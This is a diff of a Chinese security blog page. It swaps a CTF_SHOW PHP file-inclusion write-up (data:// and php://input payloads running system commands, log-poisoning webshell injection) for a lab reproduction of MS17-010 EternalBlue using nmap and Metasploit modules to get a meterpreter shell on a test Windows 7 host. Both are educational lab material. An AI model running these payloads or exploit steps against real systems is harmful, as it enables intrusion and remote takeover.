@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CTF_SHOW之web入门部分wp, Jian">
-    <meta name="description" content="先把以前做的一些ctf题wp附上，后续的再慢慢继续补上">
+    <meta name="keywords" content="ms17_010漏洞复现, Jian">
+    <meta name="description" content="漏洞描述：永恒之蓝（Eternalblue）是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CTF_SHOW之web入门部分wp | Jian</title>
+    <title>ms17_010漏洞复现 | Jian</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -224,12 +224,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">CTF_SHOW之web入门部分wp</h1>
+                    <h1 class="description center-align post-title">ms17_010漏洞复现</h1>
                 </div>
             </div>
         </div>
@@ -345,8 +345,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-                                <span class="chip bg-color">web入门_文件包含</span>
+                            <a href="/tags/ms17-010%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">ms17_010漏洞</span>
                             </a>
                         
                     </div>
@@ -357,8 +357,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/ctf-show/" class="post-category">
-                                ctf_show
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                漏洞复现
                             </a>
                         
                     </div>
@@ -370,28 +370,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-02-26
+                    2022-03-06
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2022-02-26
+                    2022-03-06
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    466
+                    495
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    2 Min
+                    1 Min
                 </div>
                 
 
@@ -414,74 +414,44 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+                <h6 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h6><p>永恒之蓝（Eternalblue）是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。</p>
+<p>原理：</p>
+<p>通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，通过恶意代码扫描并攻击开放445文件共享端口的Windows主机，只要用户主机在线，即可通过该漏洞，控制用户的主机。</p>
+<p>测试环境：</p>
+<p>攻击机：kali</p>
+<p>靶机：Windows7 (ip：192.168.102.128；在被渗透过程中需全程关闭防火墙)</p>
+<p>复现过程：</p>
+<p>1.先使用nmap对目标ip进行端口扫描，查看445端口是否有开放</p>
+<p><img src="/images/ms17_010a.png"></p>
+<p>2.进入msfconsole，搜索ms17-010</p>
+<p><img src="/images/ms17_010b.png"></p>
+<p>有两个工具可以使用，auxiliary/scanner/smb/smb_ms17_010是扫描模块；exploit/windows/smb/ms17_010_eternalblue是渗透模块；一般先进行扫描，再进行渗透。</p>
+<p>3.使用扫描模块对靶机进行扫描</p>
+<pre class="line-numbers language-none"><code class="language-none">进入扫描模块
+use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010
+设置目标ip
+set rhosts 192.168.102.128
+开始扫描
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>查看目录</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'glob:///*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/ms17_010c.png"></p>
+<p>可以发现目标ip确实存在漏洞风险</p>
+<p>4.使用渗透模块对目标进行渗透</p>
+<pre class="line-numbers language-none"><code class="language-none">进入渗透模块
+use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue
+查看当前模块所需参数
+show options
+设置目标ip
+set rhosts 192.168.102.128
+开始渗透
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>发现 include 包含函数，选择使用 data 伪协议 data://text/plain,构造 payload：?file=data://text/plain,<?php phpinfo();?>成功出现 phpinfo()页面</p>
-<p><img src="/images/web_78a.png"></p>
-<p>然后输如查询目录的指令，发现有 flag.php 文件：?file=data://text/plain,<?php system("ls");?></p>
-<p><img src="/images/web_78b.png">]</p>
-<p>使用 tac 命令读取文件，成功读取 flag:ctfshow{7bc171e1-06c8-4e6c-8e13-33585ea3d0be}</p>
-<h4 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
-if(isset($_GET[&#39;file&#39;]))&#123;
-    $file &#x3D; $_GET[&#39;file&#39;];
-    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
-    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
-    include($file);
-&#125;else&#123;
-    highlight_file(__FILE__);
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>发现这次对 php 进行了过滤，但可以使用 php 短标记<?=?>和?占位符进行读出</p>
-<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D;system(&quot;tac flag.???&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>成功读出 flag：ctfshow{e8c8a34c-8e08-4b8e-92ac-6387a53ddb92}</p>
-<h4 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
-if(isset($_GET[&#39;file&#39;]))&#123;
-    $file &#x3D; $_GET[&#39;file&#39;];
-    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
-    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
-    include($file);
-&#125;else&#123;
-    highlight_file(__FILE__);
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>这次发现还对 data 进行了替换，原本想想使用的是：</p>
-<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;Php:&#x2F;&#x2F;input
-post: &lt;?php system(&quot;ls&quot;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>但不知为什么没有显示出来，所以查看了 hint，给的提示是访问 nginx 和 apache 下的日志文件，getshell 的方法，payload 如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;489ea2b8-3fb5-4cc6-b9d6-7fc5608c320b.challenge.ctf.show&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>使用 bp 抓包，将🐎写再UA头里</p>
-<p><img src="/images/web_80a.png"></p>
-<p><img src="/images/web_80b.png"></p>
-<p><img src="/images/web_80c.png"></p>
-<h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
-if(isset($_GET[&#39;file&#39;]))&#123;
-    $file &#x3D; $_GET[&#39;file&#39;];
-    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
-    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
-    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);
-    include($file);
-&#125;else&#123;
-    highlight_file(__FILE__);
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>发现这次还将冒号给过滤了，不过却可以继续访问 var/log/nginx/access.log 日志文件进行传🐎,得到flag</p>
-<p><img src="/images/web_81.png"></p>
-<h4 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h4><p>条件竞争，限制了并发，先做后面的。</p>
+<p><img src="/images/ms17_010d.png"></p>
+<p>5.在执行完run后，开启了一个reverse tcp监听器来监听本地的4444端口，运行成功后会进入一个meterpreter会话，可以通过此会话来执行系统命令、提权、获取敏感信息等；输入shell后即可切换到目标主机的windows shell</p>
+<p><img src="/images/ms17_010f.png"></p>
+<p>对靶机执行相关命令，发现成功执行。</p>
+<p><img src="/images/ms17_010g.png"></p>
+<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>以上便是ms17_010漏洞的复现了，过程相对简单，但却获得了极大的系统权限，由此可见系统自动更新的重要性了。</p>
 
                 
             </div>
@@ -508,7 +478,7 @@ if(isset($_GET[&#39;file&#39;]))&#123;
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://forgettingme.github.io/2022/02/26/jian-web1/">https://forgettingme.github.io/2022/02/26/jian-web1/</a>
+                    <a href="https://forgettingme.github.io/2022/03/06/ms17-010-fu-xian/">https://forgettingme.github.io/2022/03/06/ms17-010-fu-xian/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -546,8 +516,8 @@ if(isset($_GET[&#39;file&#39;]))&#123;
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-                                    <span class="chip bg-color">web入门_文件包含</span>
+                                <a href="/tags/ms17-010%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">ms17_010漏洞</span>
                                 </a>
                             
                         </div>
@@ -721,9 +691,10 @@ if(isset($_GET[&#39;file&#39;]))&#123;
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
                 <a href="/2022/03/06/ms17-010-fu-xian/">
                     <div class="card-image">
@@ -741,9 +712,9 @@ if(isset($_GET[&#39;file&#39;]))&#123;
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-06
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-06
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -756,6 +727,7 @@ if(isset($_GET[&#39;file&#39;]))&#123;
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -774,19 +746,19 @@ if(isset($_GET[&#39;file&#39;]))&#123;
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/02/26/article-title/">
+                <a href="/2022/02/26/jian-web1/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="开始">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="CTF_SHOW之web入门部分wp">
                         
-                        <span class="card-title">开始</span>
+                        <span class="card-title">CTF_SHOW之web入门部分wp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            先把以前做的一些ctf题wp附上，后续的再慢慢继续补上
                         
                     </div>
                     <div class="publish-info">
@@ -797,8 +769,8 @@ if(isset($_GET[&#39;file&#39;]))&#123;
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%90%AD%E5%BB%BA/" class="post-category">
-                                    搭建
+                            <a href="/categories/ctf-show/" class="post-category">
+                                    ctf_show
                                 </a>
                             
                             
@@ -808,8 +780,8 @@ if(isset($_GET[&#39;file&#39;]))&#123;
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E8%BF%90%E8%A1%8C%E4%B8%AD/">
-                        <span class="chip bg-color">运行中</span>
+                    <a href="/tags/web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+                        <span class="chip bg-color">web入门_文件包含</span>
                     </a>
                     
                 </div>
